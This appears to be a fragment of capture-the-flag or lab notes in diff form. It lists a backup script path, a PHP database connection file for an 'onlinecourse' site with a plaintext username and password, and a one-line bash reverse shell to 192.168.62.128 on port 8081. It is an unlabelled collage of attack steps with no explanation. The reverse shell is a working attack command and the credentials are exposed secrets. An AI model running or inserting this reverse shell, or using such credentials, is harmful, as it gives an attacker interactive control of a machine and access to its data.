@@ -1,0 +1,12 @@
+/home/grimmie/backup.sh
+
+
+<?php
+$mysql_hostname = "localhost";
+$mysql_user = "grimmie";
+$mysql_password = "My_V3ryS3cur3_P4ss";
+$mysql_database = "onlinecourse";
+$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
+
+
+bash -i >& /dev/tcp/192.168.62.128/8081 0>&1
